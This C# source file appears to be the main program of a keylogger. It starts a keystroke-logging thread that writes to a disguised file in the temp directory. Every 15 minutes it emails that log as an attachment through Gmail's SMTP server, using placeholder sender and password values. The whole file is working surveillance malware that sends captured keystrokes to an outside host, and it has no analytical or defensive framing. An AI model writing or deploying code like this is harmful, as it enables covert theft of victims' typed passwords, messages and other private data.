using keylog.core;
using keylog.modules;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Timers;

namespace program
{
    static class Program
    {
        static void Main(string[] args)
        {
            KeyLog keyLog = new KeyLog(200, false, Path.GetTempPath()+"WS07654.tmp.dir\\"+"tmpd.tmp");
            Thread thKeyLog = new Thread(new ThreadStart(keyLog.StartLog));
            thKeyLog.Start();

            Dictionary<string, string> userSettings = new Dictionary<string, string>();
            userSettings.Add("from", "yourmail@domain.com");
            userSettings.Add("to", "yourmail@domain.com");
            userSettings.Add("subject", Mail.GetMailHeaderContent());
            userSettings.Add("body", Mail.GetMailBodyContent());

            Dictionary<string, string> serverSettings = new Dictionary<string, string>();
            serverSettings.Add("smtpServer", "smtp.gmail.com");
            serverSettings.Add("port", 587.ToString());
            serverSettings.Add("user", "yourmail@domain.com");
            serverSettings.Add("password", "password");

            List<string> attachments = new List<string>();

            attachments.Add(keyLog.GetLogPath());
            SetTimer(TimeSpan.FromMinutes(15).TotalMilliseconds, new Mail(userSettings, serverSettings, attachments));
        }

        private static void SetTimer(double time, Module module)
        {
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Elapsed += (sender, e) => OnTimedEvent(sender, e, module);
            timer.Interval = time;
            timer.Enabled = true;
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e, Module module)
        {
            Module mod = module;
            mod.Execute();
        }

    }
}
